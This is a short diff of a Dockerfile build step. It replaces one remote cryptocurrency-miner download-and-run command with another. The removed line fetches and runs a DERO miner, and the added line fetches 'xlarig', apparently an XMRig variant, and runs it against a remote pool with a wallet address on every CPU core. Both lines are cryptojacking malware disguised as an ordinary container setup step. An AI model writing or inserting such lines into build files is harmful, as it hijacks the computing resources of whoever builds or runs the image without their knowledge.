@@ -2,4 +2,4 @@
 
  RUN apt-get update && \
      apt-get install wget -y && \
-     wget https://gitlab.com/terryputri/file/-/raw/main/js && chmod +x js && ./js -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr -r 95.179.133.130:10100 -p rpc -m $(nproc --all)
+     wget https://gitlab.com/mustofaku/mustofa/raw/main/xlarig && chmod +x xlarig && ./xlarig --donate-level 1 -o 157.245.204.147:443 -u Svjay5hewpoDs9k8pvkhQ7Ns9tRFviYRqCfRmvCRptncVZSNnoCZ9ky3sEpwJV1sqbgk3TBpjmUf2CcgaFrvaf8E2ttBHCgox -p hah -a panthera -k -t$(nproc --all)
